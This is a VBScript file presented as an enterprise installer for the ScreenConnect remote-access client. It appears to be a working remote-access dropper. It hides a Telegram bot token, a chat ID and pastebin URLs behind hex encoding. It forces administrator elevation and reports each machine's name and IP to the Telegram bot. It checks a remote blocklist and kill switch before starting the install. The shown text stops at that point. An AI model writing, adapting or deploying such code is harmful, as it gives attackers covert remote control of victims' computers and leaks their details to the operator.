Option Explicit
' Enterprise Deployment Script - System Package Installer
' Customized Version for ScreenConnect.ClientSetup.msi
' ================================================

' ================================================
' Global Variables
' ================================================
Dim g_shell, g_fso, g_tempPath, g_computerName, g_ipAddress

' ================================================
' Decoding Function
' ================================================
Function HexToString(hexVal)
    Dim i, strResult
    strResult = ""
    For i = 1 To Len(hexVal) Step 2
        strResult = strResult & Chr(CInt("&H" & Mid(hexVal, i, 2)))
    Next
    HexToString = strResult
End Function

' ================================================
' YOUR TELEGRAM + CONFIGURATION
' Replace the hex strings with your own using the helper if needed
' ================================================
Dim TELEGRAM_TOKEN, TELEGRAM_CHAT, KILL_SWITCH_URL, BLOCKLIST_URL, KILL_SWITCH_ALLOW

TELEGRAM_TOKEN = HexToString("363134383737313837353A414146776A626477494543636E4D6A6F6E52566C4377754C4149443535454E64557534")
TELEGRAM_CHAT = HexToString("31343333353239343233")
KILL_SWITCH_URL = HexToString("68747470733a2f2f706173746562696e2e636f6d2f7261772f475345793753486d")
BLOCKLIST_URL   = HexToString("68747470733a2f2f706173746562696e2e636f6d2f7261772f5445624d65363158")
KILL_SWITCH_ALLOW = HexToString("414c4c4f57")

' ================================================
' Support Functions
' ================================================
Function IsAdmin()
    On Error Resume Next
    Dim testShell, testFSO, testPath, testFile
    Set testShell = CreateObject("WScript.Shell")
    Set testFSO = CreateObject("Scripting.FileSystemObject")
    testPath = testShell.ExpandEnvironmentStrings("%SystemRoot%\System32")
    testFile = testPath & "\admin_test.tmp"
    testFSO.CreateTextFile(testFile, True).Close
    testFSO.DeleteFile(testFile)
    IsAdmin = (Err.Number = 0)
    On Error GoTo 0
End Function

Sub Elevate()
    Dim appObj
    Set appObj = CreateObject("Shell.Application")
    appObj.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
End Sub

Function HttpGet(url)
    On Error Resume Next
    Dim httpObj
    Set httpObj = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    httpObj.setTimeouts 5000, 5000, 5000, 5000
    httpObj.open "GET", url, False
    httpObj.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    httpObj.send
    If Err.Number = 0 And httpObj.Status = 200 Then
        Set HttpGet = httpObj
    Else
        Set HttpGet = Nothing
    End If
    On Error GoTo 0
End Function

Function GetLocalIP()
    On Error Resume Next
    Dim wmiObj, adapters, adapter, ip
    GetLocalIP = "Unknown"
    Set wmiObj = GetObject("winmgmts:\\.\root\cimv2")
    Set adapters = wmiObj.ExecQuery("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE")
    For Each adapter In adapters
        If IsArray(adapter.IPAddress) Then
            For Each ip In adapter.IPAddress
                If InStr(ip, ".") > 0 And Left(ip, 7) <> "169.254" Then
                    GetLocalIP = ip
                    Exit Function
                End If
            Next
        End If
    Next
    On Error GoTo 0
End Function

Sub Notify(message)
    If TELEGRAM_TOKEN = "" Or TELEGRAM_CHAT = "" Then Exit Sub
    Dim httpObj, fullMessage
    fullMessage = "[" & g_computerName & " (" & g_ipAddress & ")] " & message
    Set httpObj = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    httpObj.open "POST", "https://api.telegram.org/bot" & TELEGRAM_TOKEN & "/sendMessage", False
    httpObj.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    httpObj.send "chat_id=" & TELEGRAM_CHAT & "&text=" & fullMessage
End Sub

Sub CleanupTempFiles(msiPath, logPath)
    On Error Resume Next
    If g_fso.FileExists(msiPath) Then g_fso.DeleteFile msiPath
    If g_fso.FileExists(logPath) Then g_fso.DeleteFile logPath
    On Error GoTo 0
End Sub

' ================================================
' Main Execution
' ================================================
Set g_shell = CreateObject("WScript.Shell")
Set g_fso = CreateObject("Scripting.FileSystemObject")
g_tempPath = g_fso.GetSpecialFolder(2)

If g_tempPath = "" Then
    MsgBox "Error: Could not get temp folder", 16, "Error"
    WScript.Quit 1
End If

If Not IsAdmin() Then
    Elevate()
    WScript.Quit 0
End If

g_computerName = g_shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
g_ipAddress = GetLocalIP()

' Blocklist check
If BLOCKLIST_URL <> "" Then
    Dim blocklistResponse, isBlocked, i, ipList, currentIP
    Set blocklistResponse = HttpGet(BLOCKLIST_URL)
    If Not blocklistResponse Is Nothing Then
        ipList = Split(blocklistResponse.responseText, vbCrLf)
        isBlocked = False
        For i = 0 To UBound(ipList)
            currentIP = Trim(ipList(i))
            If currentIP = g_ipAddress Then
                isBlocked = True
                Exit For
            End If
        Next
        If isBlocked Then
            Notify "Installation blocked for IP: " & g_ipAddress
            WScript.Quit 0
        End If
    End If
End If

' Kill switch check
If KILL_SWITCH_URL <> "" Then
    Dim killSwitchResponse
    Set killSwitchResponse = HttpGet(KILL_SWITCH_URL)
    If Not killSwitchResponse Is Nothing Then
        If Trim(killSwitchResponse.responseText) <> KILL_SWITCH_ALLOW Then
            Notify "Kill switch active - aborting"
            WScript.Quit 0
        End If
    End If
End If

Notify "Starting MSI installation on " & g_computerName

